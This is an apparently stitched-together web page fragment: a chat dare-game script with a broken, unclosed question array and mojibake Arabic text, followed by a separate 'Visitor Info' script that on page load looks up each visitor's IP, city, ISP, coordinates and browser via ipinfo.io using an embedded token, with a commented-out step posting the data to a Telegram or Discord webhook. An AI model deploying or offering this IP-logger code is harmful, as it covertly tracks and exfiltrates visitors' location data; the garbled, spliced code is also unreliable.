    <script>
        let timer;
        let isRunning = false;
        let timeLeft = 120; 
        const timerDisplay = document.getElementById("timerDisplay");
        const playButton = document.getElementById("playButton");
        const resetButton = document.getElementById("resetButton");

        function updateTimer() {
          let minutes = Math.floor(timeLeft / 60);
        let seconds = timeLeft % 60;
          timerDisplay.textContent = `${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
        }

        function startTimer() {
        if (isRunning) return;
        isRunning = true;
        timer = setInterval(function() {
        timeLeft--;
        updateTimer();
       if (timeLeft <= 0) {
       clearInterval(timer);
       isRunning = false;
       }
       }, 1000);
       }

        function resetTimer() {
        clearInterval(timer);
        isRunning = false;
        timeLeft = 120;
        updateTimer();
        }

        playButton.addEventListener("click", function() {
            startTimer();
        });

        resetButton.addEventListener("click", function() {
            resetTimer();
        });

        updateTimer(); 

        let questions = [
            "ÿ™ÿ¥ŸäŸÑ ÿßÿ≠ÿØ ÿßŸÑŸÖŸàÿØÿßÿ™",

            "ÿßÿ∑ÿπŸÜ ÿ´ŸÜŸäŸÜ ŸÖŸÜ ÿßŸÑÿ¥ÿßÿ™ ÿ™ÿßŸäŸÖ ÿßŸàÿ™",
            "ÿ™ÿ®ŸÜÿØ ÿßÿ≠ÿØ ŸÖŸÜ ÿßÿÆÿ™Ÿäÿßÿ±ŸÉ",
            "ŸÖÿßŸÑŸÉ ÿ¥Ÿäÿ° ÿπŸÜÿØŸä",

            "ÿ™ÿ∫Ÿäÿ± ÿµŸàÿ±ÿ™ŸÉ ŸÅŸä ÿ£Ÿä ÿ™ÿ∑ÿ®ŸäŸÇ ÿ≠ÿ≥ÿ® ÿßÿÆÿ™Ÿäÿßÿ± ÿßŸÑŸä ŸÖÿπŸÉ",

        function shuffleArray(array) {
            for (let i = array.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [array[i], array[j]] = [array[j], array[i]];
            }
        }

        function createBoard() {
            let gameBoard = document.getElementById("gameBoard");
            gameBoard.innerHTML = "";
            for (let i = 0; i < 30; i++) {
                let box = document.createElement("div");
                box.classList.add("box");
                box.textContent = i + 1;
                box.onclick = function () {
                    if (!box.classList.contains("opened")) {
                        box.classList.add("opened");
                        box.textContent = questions[i];
                        box.style.backgroundColor = getRowColor(i);
                        box.classList.add("zoomed");
                    } else {
                        box.classList.remove("zoomed");
                    }
                };
                gameBoard.appendChild(box);
            }
        }

        function getRowColor(index) {
            return Math.floor(index / 6) % 2 === 0 ? "#20B2AA" : "#D8BFD8";
        }

        function randomizeQuestions() {
            shuffleArray(questions);
            resetGame();
        }

        function resetGame() {
            createBoard();
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                if (document.exitFullscreen) {
                    document.exitFullscreen();
                }
            }
        }

<body style="background:#111; color:#0f0; font-family: monospace; padding:20px;">

  <h2>Visitor Info:</h2>
  <pre id="info">Loading...</pre>

  <script>
    async function getVisitorInfo() {
      const ipInfo = await fetch('https://ipinfo.io/json?token=ac124db0618aa8')
        .then(res => res.json());

      const userAgent = navigator.userAgent;
      const time = new Date().toLocaleString();

      const data = {
        IP: ipInfo.ip,
        City: ipInfo.city,
        Region: ipInfo.region,
        Country: ipInfo.country,
        ISP: ipInfo.org,
        Location: ipInfo.loc,
        Browser: userAgent,
        Time: time
      };

      document.getElementById('info').textContent = JSON.stringify(data, null, 2);

      // OPTIONAL: Send to Webhook (Telegram, Discord, etc.)
      /*
      fetch('YOUR_WEBHOOK_URL', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });
      */
    }

    getVisitorInfo();
  </script>
